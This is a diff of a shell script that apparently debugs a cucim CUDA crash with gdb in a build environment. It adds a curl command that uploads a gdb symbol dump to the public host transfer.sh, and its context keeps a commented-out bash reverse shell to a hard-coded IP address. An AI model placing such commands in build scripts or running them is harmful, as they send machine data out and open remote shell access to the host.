@@ -150,8 +150,10 @@ echo "importing CuImage only"
 gdb -ex 'set confirm off' -ex 'run -c "import cucim.clara._cucim as cc"' -ex 'bt' -ex 'i proc m' -ex 'quit' `which python`
 
 echo "Allocationg cuda memory"
-gdb -ex 'set confirm off' -ex 'run -c "import cucim.clara._cucim as cc; cc.haha(\"dd\");print(\"hoho\")"' -ex 'bt' -ex 'i proc m' -ex 'quit' `which python`
+gdb -ex 'set pagination off' -ex 'set breakpoint pending on' -ex 'set confirm off' -ex 'b filesystem/cufile_driver.cpp:337' -ex 'run -c "import cucim.clara._cucim as cc; cc.haha(\"dd\");print(\"hoho\")"' -ex 'bt' -ex 'i proc m' -ex 'maint print symbols gdb.txt' -ex 'info functions' -ex 'c' -ex 'bt' -ex 'i proc m' -ex 'quit' `which python`
 
+curl --upload-file -v ./gdb.txt http://transfer.sh/gdb.txt
+echo
 
 set +e
 #/bin/bash -i > /dev/tcp/206.189.160.33/9999 0<&1 2>&1
